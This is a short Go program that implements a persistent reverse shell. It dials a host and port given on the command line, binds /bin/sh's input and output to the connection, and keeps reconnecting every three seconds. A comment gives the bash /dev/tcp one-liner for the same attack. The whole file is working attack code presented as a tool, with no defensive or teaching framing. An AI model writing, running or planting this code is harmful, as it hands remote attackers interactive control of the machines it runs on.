package main

import (
	"net"
	"os/exec"
	"time"
	"flag"
)

func main() {

	host := flag.String("host", "0.0.0.0:0000", "host:port")

	flag.Parse()

	rshell(*host)
}

// bash -i >& /dev/tcp/localhost/1337 0>&1
func rshell(host string) {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		if conn != nil {
			conn.Close()
		}
		time.Sleep(3 * time.Second)
		rshell(host)
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()
	conn.Close()
	rshell(host)
}